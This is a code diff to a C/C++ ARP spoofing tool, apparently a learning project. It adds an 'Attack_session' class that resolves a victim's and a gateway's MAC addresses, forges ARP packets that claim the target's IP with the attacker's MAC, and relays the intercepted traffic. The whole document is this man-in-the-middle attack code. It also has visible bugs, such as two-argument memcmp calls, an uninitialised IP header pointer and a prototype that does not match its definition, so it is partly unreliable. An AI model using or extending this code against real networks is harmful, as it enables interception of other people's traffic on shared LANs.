@@ -9,6 +9,12 @@
 #include <sys/socket.h>
 #include <arpa/inet.h>
 
+//for getmyIP()
+#include <sys/types.h>
+#include <sys/ioctl.h>
+#include <net/if.h>
+#include <unistd.h>
+
 #pragma pack(push, 1)
 struct Ethnet_header{
 	uint8_t dstMac[6];
@@ -56,11 +62,10 @@ struct Tcp_header{
 };
 #pragma pack(pop)
 
-
 static unsigned char ascii2byte(char *val);
 
 int getmyMAC(char* buf, char* dev);
-int arp_spoof(char* out_packet, char* in_packet,int sender, int target, char* myMAC);
+uint32_t getmyIP(char* dev);
 int check_arp_type(struct Arp_header *arph, uint16_t htype, uint16_t ptype, uint8_t hlen, uint8_t plen );
 int analyze_packet( char* packet );
 int print_eth(struct Ethnet_header* eth);
@@ -70,71 +75,107 @@ int print_body( uint8_t* start, uint32_t len );
 
 
 
-static unsigned char ascii2byte(char *val)
-{
-    unsigned char temp = *val;
+class Attack_session{
+	private:
+		uint32_t senderIP;
+		uint8_t senderMAC[6];
+		uint32_t targetIP;
+		uint8_t targetMAC[6];
 
-    if(temp > 0x60) temp -= 39;  // convert chars a-f
-    temp -= 48;  // convert chars 0-9
-    temp *= 16;
+		uint32_t myIP;
+		uint8_t myMAC[6];
 
-    temp += *(val+1);
-    if(*(val+1) > 0x60) temp -= 39;  // convert chars a-f
-    temp -= 48;  // convert chars 0-9   
+		int ready;
 
-    return temp;
+	public:
+		/*
+		Attack_session(uint32_t _senderIP, uint32_t _targetIP, uint32_t _myIP, uint8_t* _myMAC){
+			senderIP = _senderIP;
+			targetIP = _targetIP;
+			memset(senderMAC,0x00,sizeof(senderMAC));
+			memset(targetMAC,0x00,sizeof(targetMAC));
 
+			myIP = _myIP;
+			memcpy(myMAC,_myMAC,sizeof(myMAC));
+		}
+		*/
+		
+		Attack_session(uint8_t* _senderIPstr, uint8_t* _targetIPstr, uint8_t* _myIPstr, uint8_t* _myMAC);
+
+		Attack_session(uint8_t* _senderIPstr, uint8_t* _targetIPstr, uint32_t _myIP, uint8_t* _myMAC);
+
+		~Attack_session(){
+
+		}
+
+		int send_true_request(char* out_packet, int whom_1sender_2target);
+		int recv_true_reply(char* in_packet);
+		
+		int send_false_request(char* out_packet);
+		int recv_request(char* out_packet, char* in_packet);
+
+		int chk_relay_condition(char* in_packet);
+		int make_relay_packet(char* out_packet, char* in_packet, int size);
+
+		int is_ready();
+		void print_me();
+};
+
+Attack_session::Attack_session(uint8_t* _senderIPstr, uint8_t* _targetIPstr, uint8_t* _myIPstr, uint8_t* _myMAC){
+	senderIP = inet_addr( (char*) _senderIPstr);
+	targetIP = inet_addr( (char*) _targetIPstr);
+	memset(senderMAC,0x00,sizeof(senderMAC));
+	memset(targetMAC,0x00,sizeof(targetMAC));
+
+	myIP = inet_addr( (char*) _myIPstr);
+	memcpy(myMAC,_myMAC,sizeof(myMAC));
+
+	ready=0;
 }
 
+Attack_session::Attack_session(uint8_t* _senderIPstr, uint8_t* _targetIPstr, uint32_t _myIP, uint8_t* _myMAC){
+	senderIP = inet_addr( (char*) _senderIPstr);
+	targetIP = inet_addr( (char*) _targetIPstr);
+	memset(senderMAC,0x00,sizeof(senderMAC));
+	memset(targetMAC,0x00,sizeof(targetMAC));
 
-int getmyMAC(char* buf, char* dev){
-	char macstring[20];
-	char filename[256];
-	char MAC[6];
-	FILE* pf;
-	int i;
-	sprintf(filename,"/sys/class/net/%s/address",dev);
-	if ( !( pf = fopen(filename,"r") ) ){
-		return -1;
-	}
-	if ( sizeof(buf) <6){
-		return -2;
-	}
-	fread(macstring,1,17,pf);
-	fclose(pf);
-	for(i=0;i<6;i++)
-		buf[i] = ascii2byte(macstring+i*3);
-	return 1;
+	myIP = _myIP;
+	memcpy(myMAC,_myMAC,sizeof(myMAC));
+
+	ready=0;
 }
 
+int Attack_session::chk_relay_condition(char* in_packet){
 
-int chk_relay_condition(char* in_packet, uint32_t myIP){
 	struct Ethnet_header* eth_hp;
 	struct Ip4_header* ip4_hp;
 	
 	eth_hp = (struct Ethnet_header*) in_packet;
 	in_packet += sizeof(struct Ethnet_header);
 	
-	//only IPv4
+	//only IPv4 (+ not ARP)
 	if( ntohs((*eth_hp).type) != ETHERTYPE_IP ){
 		return -1;
 	}
 	//do not relay broadcast
 	char broadcast[] = "\xFF\xFF\xFF\xFF\xFF\xFF";
-	if( !memcmp( (*eth_hp).dstMAC , broadcast , 6 ) ){ 
+	if( !memcmp( (*eth_hp).dstMac , broadcast , 6 ) ){ 
 		return -2;
 	}
 	//do not relay packet to me
 	if( (*ip4_hp).dst == myIP ){
 		return -3;
 	}
-	//check sender?
+	//check senderMAC
+	if( memcmp((*eth_hp).srcMac,senderMAC) ){
+		return -4;
+	}
 
 	return 1;
 }
 
-int make_relay_packet(char* out_packet, char* in_packet, int size, char* myMAC, char* targetMAC)
-{
+int Attack_session::make_relay_packet(char* out_packet, char* in_packet, int size){
+
 	if( sizeof(out_packet) < size ){
 		return -1;
 	}
@@ -146,9 +187,81 @@ int make_relay_packet(char* out_packet, char* in_packet, int size, char* myMAC, 
 	return 1;
 }
 
+int Attack_session::send_true_request(char* out_packet, int whom_1sender_2target){
+	memset(out_packet,0,sizeof(out_packet));
+	char broadcast[] = "\xFF\xFF\xFF\xFF\xFF\xFF";
+	//eth
+	memcpy(out_packet,	broadcast,6); //dstMAC
+	memcpy(out_packet+6,	myMAC,6); //srcMAC = myMAC
+	uint16_t ethtype_arp = htons(ETHERTYPE_ARP);
+	memcpy(out_packet+12,	&ethtype_arp,2);
+	//arp
+	char arptype[] = "\x00\x01\x08\x00\x06\x04";
+	memcpy(out_packet+14,	arptype,6); //copy original htype,ptype,hlen,plen
+	uint16_t ARPrequest=htons(1);
+	memcpy(out_packet+20,	&ARPrequest,2); //op ARP request
+	memcpy(out_packet+22,	myMAC,6); //senderMAC = myMAC
+	memcpy(out_packet+28,	&myIP,4); //senderIP = myIP
+	memcpy(out_packet+32,	broadcast,6); //targetMAC = broadcast
+	if(whom_1sender_2target == 1)
+		memcpy(out_packet+38,&senderIP,4); //targetIP = senderIP
+	else if(whom_1sender_2target == 2)
+		memcpy(out_packet+38,&targetIP,4); //targetIP = targetIP
+	else
+		return -1;
+	return 1;
+}
 
-int arp_spoof(char* out_packet, char* in_packet, int sender, int target, char* myMAC)
-{
+int Attack_session::recv_true_reply(char* in_packet){
+	struct Ethnet_header* eth_hp;
+	struct Arp_header* arp_hp;
+
+	eth_hp = (struct Ethnet_header*) in_packet;
+	
+	if( ntohs((*eth_hp).type) != ETHERTYPE_ARP ){
+		return -1;
+	}
+
+	arp_hp = (struct Arp_header*)( in_packet+sizeof(struct Ethnet_header) );
+
+	if(!check_arp_type(arp_hp,1,0x0800,6,4)){
+		return -2;
+	}
+	if( ntohs((*arp_hp).op)!=2 ){
+		return -3;
+	}
+	if( !memcmp((*arp_hp).targetIP , myIP ) ){ //packet to me
+		if( !memcmp((*arp_hp).senderIP , senderIP) )
+			memcpy(senderMAC, (*arp_hp).senderMAC, 6);
+		if( !memcmp((*arp_hp).senderIP , targetIP) )
+			memcpy(targetMAC, (*arp_hp).senderMAC, 6);
+		return 1;
+	}
+	return 0;
+}
+
+int Attack_session::send_false_request(char* out_packet){
+	memset(out_packet,0,sizeof(out_packet));
+	//eth
+	memcpy(out_packet,	senderMAC,6); //dstMAC=senderMAC
+	memcpy(out_packet+6,	myMAC,6); //srcMAC = myMAC
+	uint16_t ethtype_arp = htons(ETHERTYPE_ARP);
+	memcpy(out_packet+12,	&ethtype_arp,2);
+	//arp
+	char arptype[] = "\x00\x01\x08\x00\x06\x04";
+	memcpy(out_packet+14,	arptype,6); //copy original htype,ptype,hlen,plen
+	uint16_t ARPrequest=htons(1);
+	memcpy(out_packet+20,	&ARPrequest,2); //op ARP request
+	memcpy(out_packet+22,	myMAC,6); //senderMAC = myMAC
+	memcpy(out_packet+28,	&targetIP,4); //senderIP = targetIP
+	memcpy(out_packet+32,	senderMAC,6); //targetMAC = senderMAC
+	memcpy(out_packet+38,	&senderIP,4); //targetIP = senderIP
+
+	ready = 2;
+	return 1;
+}
+
+int Attack_session::recv_request(char* out_packet, char* in_packet){
 	struct Ethnet_header* eth_hp;
 	struct Arp_header* arp_hp;
 
@@ -166,10 +279,10 @@ int arp_spoof(char* out_packet, char* in_packet, int sender, int target, char* m
 	if( ntohs((*arp_hp).op)!=1 ){
 		return -3;
 	}
-	if( (*arp_hp).senderIP != sender ){
+	if( (*arp_hp).senderIP != senderIP ){
 		return -4;
 	}
-	if( (*arp_hp).targetIP != target ){
+	if( (*arp_hp).targetIP != targetIP ){
 		return -5;
 	}
 
@@ -189,10 +302,82 @@ int arp_spoof(char* out_packet, char* in_packet, int sender, int target, char* m
 	return 1;
 }
 
+void Attack_session::print_me(){
+	printf("sender IP : %s , ",inet_ntoa( *(struct in_addr*)( &senderIP ) ) );
+	printf("target IP : %s\n" ,inet_ntoa( *(struct in_addr*)( &targetIP ) ) );
+}
+
+int Attack_session::is_ready(){
+	if( ready > 0 ) return ready;
+	
+	char blank = "\x00\x00\x00\x00\x00\x00";
+	if( memcmp(blank,senderMAC,6) && memcmp(blank,targetMAC,6) )
+		ready = 1;
+	return ready;
+}
+
+
+static unsigned char ascii2byte(char *val)
+{
+    unsigned char temp = *val;
+
+    if(temp > 0x60) temp -= 39;  // convert chars a-f
+    temp -= 48;  // convert chars 0-9
+    temp *= 16;
+
+    temp += *(val+1);
+    if(*(val+1) > 0x60) temp -= 39;  // convert chars a-f
+    temp -= 48;  // convert chars 0-9   
+
+    return temp;
+}
+
+
+int getmyMAC(char* buf, char* dev){ //only for linux
+	char macstring[20];
+	char filename[256];
+	FILE* pf;
+	int i;
+	sprintf(filename,"/sys/class/net/%s/address",dev);
+	if ( !( pf = fopen(filename,"r") ) ){
+		return -1;
+	}
+	if ( sizeof(buf) <6){
+		return -2;
+	}
+	fread(macstring,1,17,pf);
+	fclose(pf);
+
+	for(i=0;i<6;i++)
+		buf[i] = ascii2byte(macstring+i*3);
+	return 1;
+}
+
+int getmyIP(char* buf, char* dev){ //return = IPaddr
+	int fd;
+	struct ifreq ifr;
+	
+	char *iface = dev;
+	fd = socket(AF_INET, SOCK_DGRAM, 0);
+	
+	ifr.ifr_addr.sa_family = AF_INET;
+	strncpy( ifr.ifr_name, iface, IFNAMSIZ -1);
+	ioctl(fd, SIOCGIFADDR, &ifr);
+	close(fd);
+	strncpy(buf, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), 16 ); //don't know sizeof(buf) yet, therefore use 16
+	return 1;
+}
+
+
+
 int check_arp_type(struct Arp_header *arph, uint16_t htype, uint16_t ptype, uint8_t hlen, uint8_t plen ){
 	return ( ntohs(arph->htype) == htype && ntohs(arph->ptype) == ptype 
 	&& arph->hlen == hlen && arph->plen == plen);
 }
+
+
+
+
 
 
 
@@ -223,7 +408,7 @@ int analyze_packet( char* packet )
 			
 			data = packet + sizeof(*eth_hp) + ((ip4_hp->ver_len)%16)*4 + ((tcp_hp->offset)>>4)*4;
 			data_size = ntohs(ip4_hp->total_length) - ((ip4_hp->ver_len)%16)*4 + ((tcp_hp->offset)>>4)*4;
-			print_body(data,data_size);
+			print_body( (uint8_t*)data,data_size);
 		}
 	}
 		
